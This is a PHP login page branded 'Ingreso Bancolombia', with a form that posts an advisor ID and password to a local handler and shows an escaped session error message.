<?php
session_start();
$error_message = isset($_SESSION['error_message']) ? $_SESSION['error_message'] : '';
unset($_SESSION['error_message']);
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="login.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <title>Ingreso Bancolombia</title>
    <link rel="icon" href="favicon.png" type="image/png">
</head>

<body>
    <div class="text-center">
        <h1><img src="logo2.png" title="Bancolombia"></h1>
        <div class="paragraph">
            <p>¡Te damos la bienvenida! Por favor digita tu número de identificación.</p>
        </div>
    </div>

    <div class="container">
        <div class="row justify-content-center">
            <div class="col-sm-5">
                <div class="card text-bg-light mb-3">
                    <div class="card-body">
                        <div class="card-top">
                            <?php if ($error_message): ?>
                                <div class="alert alert-danger alert-dismissible fade show" role="alert">
                                    <?php echo htmlspecialchars($error_message); ?>
                                </div>
                            <?php endif; ?>
                            <form action="advisor_login_handler.php" method="POST">
                                <div class="card-top-left">
                                    <h4 class="card-title">Ingresa</h4>
                                    <p class="card-text mb-3">Escribe tu número de identificación:</p>
                                </div>
                                <div class="iconos">
                                    <i class="fa-solid fa-key"></i>
                                </div>
                                <div class="mb-3">
                                    <input type="number" class="form-control" id="id_advisor" name="id_advisor"
                                        placeholder="Número de identificación" min="1" required>
                                </div>
                                <div class="mb-3">
                                    <input type="password" class="form-control" id="pw_advisor" name="pw_advisor"
                                        placeholder="Contraseña" required>
                                </div>
                                <div class="d-grid gap-2 d-md-block text-center">
                                    <button class="btn btn-lg btn-block btnForm" type="submit" id="btn_sign"
                                        name="btn_sign">Acceder</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
